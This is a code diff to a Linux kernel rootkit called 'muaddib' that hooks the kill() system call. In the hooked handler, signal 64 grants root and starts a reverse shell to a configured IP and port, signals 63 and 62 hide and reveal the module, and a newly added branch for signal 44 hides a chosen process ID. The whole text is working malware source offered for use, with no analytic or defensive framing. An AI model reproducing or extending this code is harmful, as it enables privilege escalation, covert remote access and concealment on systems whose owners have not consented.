@@ -81,7 +81,7 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
 {
     void set_root(void);
 
-    if(sig == 64){
+	if(sig == 64){
         #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: giving root");
         #endif
@@ -94,22 +94,31 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
         printk(KERN_INFO "muaddib: starting reverse shell from kill");
         #endif
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
+        return 0;
     }
 
-    else if(sig == 43){
-        if(hidden == 0){
-            #if DEBUGMSG == 1
-            printk(KERN_INFO "muaddib: showing");
-            #endif
-            showme();
-        }
-        else if(hidden == 1){
-            #if DEBUGMSG == 1
-            printk(KERN_INFO "muaddib: hiding");
-            #endif
-            hideme();
-        }
+    else if(sig == 63){
+        #if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: hiding");
+        #endif
+        hideme();
+        return 0;
     }
+    else if(sig == 62){
+        #if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: showing");
+        #endif
+        showme();
+        return 0;
+    }
+    else if(sig == 44){
+        #if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: hiding %d", pid);
+        #endif
+        sprintf(hide_pid, "%d", pid);
+        return 0;
+    }
+
 
     return og_kill(pid, sig);
 }
